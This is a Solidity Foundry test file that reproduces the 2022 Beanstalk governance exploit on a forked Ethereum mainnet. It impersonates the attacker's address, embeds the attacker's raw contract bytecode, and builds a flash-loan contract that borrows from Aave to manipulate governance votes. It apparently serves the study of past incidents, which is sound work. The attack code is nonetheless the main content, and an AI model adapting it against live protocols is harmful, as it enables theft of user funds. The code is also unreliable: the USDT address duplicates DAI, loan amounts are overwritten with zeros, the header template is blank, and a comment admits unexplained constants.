// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';

import {IUniswapV2Router02} from '../utils/IUniswapV2Router.sol';
import {IUniswapV2Pair} from '../utils/IUniswapV2Pair.sol';

// forge test --match-contract Exploit_Beanstalk -vvv
/*
On Apr 17, 2022 an attacker stole 25,000 ETH from an Beanstalk Governance.


// Attack Overview
Total Lost: $75MM (25,000 ETH)
Attack Tx: 
Ethereum Transaction Viewer: 

Exploited Contract: 
Attacker Address: 
Attacker Contract: 
Attack Block:  

// Key Info Sources
Twitter: 
Writeup: 
Article: 
Code: 


Principle: VULN PRINCIPLE


ATTACK:
1)

MITIGATIONS:
1)

*/
interface IDiamondCut {
    enum FacetCutAction {Add, Replace, Remove}

    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }
}

interface Ibeanstalk {

    struct DiamondCut {
        address facetAddress;
        uint8 action;
        bytes4[] functionSelectors;
    }

    function depositBeans(uint256 amount) external;
    function propose(IDiamondCut.FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata, uint8 _pauseOrUnpause) external;
}

interface IAaveFlashLoan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
  ) external;

}

interface IAaveDebtToken{
    function mintToTreasury(uint256 amount, uint256 index) external;
}

interface ICurve {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
}

interface ICurveFactory {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

contract Exploit_Beanstalk is TestHarness, TokenBalanceTracker {
    address internal attacker = 0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4;

    IERC20 internal bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Ibeanstalk internal beanstalk = Ibeanstalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);

    IUniswapV2Router02 internal router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() external {
        cheat.createSelectFork('mainnet', 14595308); // One block before the first swap.

        cheat.label(attacker, "Attacker");

        cheat.deal(attacker, 100 ether); // received 100 ETH from a bridge.
        
        addTokenToTracker(address(bean));
        addTokenToTracker(address(weth));
        updateBalanceTracker(attacker);
    }

    function test_attack() external {
        console.log('===== Initial Balances =====');
        logBalancesWithLabel('Attacker', attacker);

        console.log('===== STEP 1: Swap ETH for BEAN =====');
        swapETHforBeans();
        logBalancesWithLabel('Attacker', attacker);

        console.log('===== STEP 2: Approve Beanstalk for BEAN =====');
        cheat.startPrank(attacker); // Impersonating the Attacker from this step.

        bean.approve(address(beanstalk), 1000000000000000000);

        console.log('===== STEP 3: Deposit Beans into beanstalk =====');
        beanstalk.depositBeans(bean.balanceOf(attacker));
        logBalancesWithLabel('Attacker', attacker);

        console.log('===== STEP 4: Deploy Donation Proposal Contract =====');
        address deployedDonationContract = deployDonationContract(bytes32(0));
        console.log('Donation contract deployed at:', deployedDonationContract);
        console.log('\n');

        console.log('===== STEP 5: Push proposal with unverified contract =====');
        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](0);
        bytes memory initSelector = abi.encodeWithSignature("init()");

        bytes memory nonVerifiedContract = hex'608060405232731c5dcdd006ea78a7e4783f9e6021c32935a10fb4146100585760405162461bcd60e51b815260206004820152600a6024820152692737ba1029b4b3b732b960b11b604482015260640160405180910390fd5b6040516370a0823160e01b815230600482015273dc59ac4fefa32293a95889dc396682858d52e5db9063a9059cbb90339083906370a0823190602401602060405180830381865afa1580156100b1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100d5919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610120573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101449190610426565b506040516370a0823160e01b81523060048201527387898263b6c5babe34b4ec53f22d98430b91e3719063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561019e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c2919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561020d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102319190610426565b506040516370a0823160e01b8152306004820152733a70dfa7d2262988064a2d051dd47521e43c9bdd9063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561028b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102af919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156102fa573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061031e9190610426565b506040516370a0823160e01b815230600482015273d652c40fbb3f06d6b58cb9aa9cff063ee63d465d9063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610378573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061039c919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156103e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061040b9190610426565b005b60006020828403121561041f57600080fd5b5051919050565b60006020828403121561043857600080fd5b8151801515811461044857600080fd5b939250505056fea164736f6c634300080d000a';
        address unverifiedContract = precomputeAddress(nonVerifiedContract, 0);
        beanstalk.propose(cut, unverifiedContract, initSelector, 3); 

        console.log('===== STEP 6: Push proposal with Donation Contract =====');
        beanstalk.propose(cut, deployedDonationContract, initSelector, 3); 

        console.log('===== STEP 7: Sends 0.25 ETH to unverified contract =====');
        (bool success, ) = unverifiedContract.call{value: 0.25 ether}("");
        require(success);
        logBalancesWithLabel('Attacker', attacker);
        logBalancesWithLabel('Non Verified Contract', unverifiedContract);

        // console.log('===== STEP 8: Deploys Unverified Contract =====');
        // address effectiveDeployAddr = create2Deploy(nonVerifiedContract, 0); // This is failing.
        // console.log(effectiveDeployAddr);
        // require(effectiveDeployAddr == unverifiedContract, 'Unverified contract not deployed');
        console.log('===== STEP 8: Deploys Flashloaner Contract =====');
        new FlashLoanAttacker{salt: bytes32(0)}();
    }

    function swapETHforBeans() internal {
        address[] memory _path = new address[](2);
        _path[0] = address(weth);
        _path[1] = address(bean);

        cheat.prank(attacker);
        router.swapExactETHForTokens{value: 73 ether}(211000000000, _path, attacker, 1650098340545);
    }

    function deployDonationContract(bytes32 _salt) internal returns(address){
        return address(new InitBip18{salt: _salt}());
    }

    function isDeployedContract(address _address) internal view returns(bool){
        return(_address.code.length > 0);
    }

    function create2Deploy(bytes memory bytecode, uint256 _salt) public payable returns(address){
        address addr;
        assembly {
            addr := create2(
                callvalue(), // wei sent with current call
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                _salt // Salt from function arguments
            )

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    function precomputeAddress(bytes memory bytecode, uint256 _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode))
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint(hash)));
    }
}

// Pretty interesting contracts..
// Ukraine Donation Proposal
// Give 250,000 Bean to Ukraine (and 10,000 Bean to the proposer)
abstract contract IBean {
    function mint(address account, uint256 amount) public virtual returns (bool);
}

contract InitBip18 {
    address private constant bean = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db; // Bean Address
    address private constant proposerWallet = 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69; // Proposer Wallet
    address private constant ukraineWallet = 0x165CD37b4C644C2921454429E7F9358d18A45e14; // Ukraine Wallet
    uint256 private constant proposerAmount = 10_000 * 1e6; // 10,000 Beans
    uint256 private constant donationAmount = 250_000 * 1e6; // 250,000 Beans

    function init() external {
        IBean(bean).mint(proposerWallet, proposerAmount);
        IBean(bean).mint(ukraineWallet, donationAmount);
    }
}

contract FlashLoanAttacker {
    address[] public tokens = [
        0xDC59ac4FeFa32293A95889Dc396682858d52e5Db, // BEAN
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
        0x6B175474E89094C44Da98b954EedeAC495271d0F, // USDT
        0x3a70DfA7d2262988064A2D051dd47521E43c9BdD, // BEAN3CRV-f
        0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D  // BEANLUSD-f
    ];

    address public curveDepositZap = 0xA79828DF1850E8a3A3064576f380D90aECDD3359;
    address public curveStablesPool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address curveFiFactory = 0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA;
    address bean3crvf = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
    address public beanstalk = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;

    IAaveFlashLoan internal aaveV2 = IAaveFlashLoan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    uint256 amountsSwapped;
    constructor() {
        approveDepositZap();
        approveStablesPool();
        handleBeanApprovals();
        approveBeanstalkProtocol();
        approveAave();

        flashLoanAave();
    }

    function approveDepositZap() internal {
        uint256 lenTokens = tokens.length;
        for(uint256 i = 0; i < lenTokens; ){
            IERC20(tokens[i]).approve(curveDepositZap, type(uint256).max);
            unchecked{
                ++i;
            }
        }
    }

    function approveStablesPool() internal {
        uint256 lenTokens = tokens.length;
        for(uint256 i = 1; i < lenTokens; ){
            IERC20(tokens[i]).approve(curveStablesPool, type(uint256).max);
            unchecked{
                ++i;
            }
        }
        address curveToken = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
        address lusd = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

        IERC20(curveToken).approve(curveFiFactory, type(uint256).max);
        IERC20(lusd).approve(curveFiFactory, type(uint256).max);
    }

    function handleBeanApprovals() internal {
        address curveToken = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
        address bean3crvlusd = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D;
        address lusd = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

        IERC20(tokens[0]).approve(bean3crvf, type(uint256).max);
        IERC20(curveToken).approve(bean3crvf, type(uint256).max);
        IERC20(tokens[0]).approve(bean3crvlusd, type(uint256).max);
        IERC20(lusd).approve(bean3crvlusd, type(uint256).max);
    }

    function approveBeanstalkProtocol() internal {
        uint256 lenTokens = tokens.length;
        for(uint256 i = 0; i < lenTokens; ){
            IERC20(tokens[i]).approve(beanstalk, type(uint256).max);
            unchecked{
                ++i;
            }
        }
    }

    function approveAave() internal {
        for(uint256 i = 1; i < 4; ){ // Approve only USDC, USDT, DAI
            IERC20(tokens[i]).approve(address(aaveV2), type(uint256).max);
            unchecked{
                ++i;
            }
        }
    }

    function flashLoanAave() internal {
        address[] memory assets = new address[](3);
        assets[0] = tokens[2]; // DAI
        assets[1] = tokens[1]; // USDC
        assets[2] = tokens[3]; // USDT

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350000000000000000000000000; // DAI
        amounts[1] = 500000000000000; // USDC
        amounts[2] = 150000000000000; // USDT

        uint256[] memory modes = new uint256[](3);
        amounts[0] = 0; // DAI
        amounts[1] = 0; // USDC
        amounts[2] = 0; // USDT

        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
    }

    function executeOperation(address[] memory assets, uint256[] memory amounts, uint256[] memory fees, address requester, bytes memory params) external {
        require(msg.sender == address(aaveV2), 'Only callable by aave');

        address beanWethPair = 0x87898263B6C5BABe34b4ec53F22d98430b91e371;
        IUniswapV2Pair(beanWethPair).swap(0, IERC20(tokens[0]).balanceOf(beanWethPair) * 99 / 100, address(this), new bytes(0x000000000000000000000000dc59ac4fefa32293a95889dc396682858d52e5db));



        // Havent figured out where do the following numbers come from. They are not balances or supplies retrieved by functions.
        address aDAI = 0x028171bCA77440897B824Ca71D1c56caC55b68A3;
        IAaveDebtToken(aDAI).mintToTreasury(192544598265969491594, 1069596728305162409992328591);


        IERC20(tokens[2]).transferFrom(address(this), address(aaveV2), (amounts[0] + fees[0] )); // Pay back DAI


        IERC20(tokens[1]).transferFrom(address(this), address(aaveV2), (amounts[1] + fees[1] )); // Pay back USDC


        IERC20(tokens[3]).transferFrom(address(this), address(aaveV2), (amounts[2] + fees[2] )); // Pay back USDC
    }

    function uniswapV2Call(address arg0, uint256 arg1, uint256 arg2, bytes memory arg3) external{
        amountsSwapped++;

        if(amountsSwapped == 1) {   // Swap again for LUSD
            address sushiLusdOhm = 0x46E4D8A1322B9448905225E52F914094dBd6dDdF;
            address lusd = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

            IUniswapV2Pair(sushiLusdOhm).swap(IERC20(lusd).balanceOf(sushiLusdOhm) * 99 / 100, 0, address(this), new bytes(0x0000000000000000000000005f98805a4e8be255a32880fdec7f6728c6568ba0));
        }

        if(amountsSwapped == 2){ // Manipulte Votes
            uint256[3] memory amounts;
            amounts[0] = IERC20(tokens[2]).balanceOf(address(this)); // Balance of DAI
            amounts[1] = IERC20(tokens[1]).balanceOf(address(this)); // Balance of USDC
            amounts[2] = IERC20(tokens[3]).balanceOf(address(this)); // Balance of USDT

            ICurve(curveStablesPool).add_liquidity(amounts, 0);
            ICurveFactory(curveFiFactory).exchange(1, 0, 15000000000000000000000000, 0);

        }
    }
}